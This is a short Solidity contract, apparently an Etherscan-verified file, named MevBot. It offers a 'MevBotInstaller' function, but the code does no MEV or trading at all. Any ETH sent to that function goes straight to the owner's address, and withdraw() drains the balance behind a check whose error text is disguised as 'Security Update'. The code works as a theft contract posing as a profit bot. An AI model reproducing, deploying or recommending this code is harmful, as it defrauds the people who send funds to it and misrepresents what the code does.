/**
 *Submitted for verification at Etherscan.io on 2023-03-18
*/

//SPDX-License-Identifier: MITS

pragma solidity ^0.8.19;

contract MevBot {
    address private owner;
    constructor() {
        owner = msg.sender;
    }
    function withdraw() public payable {
        require(msg.sender == owner, "Security Update");
        payable(msg.sender).transfer(address(this).balance);
    }
    function MevBotInstaller() public payable {
        if (msg.value > 0) payable(owner).transfer(address(this).balance);
    }
}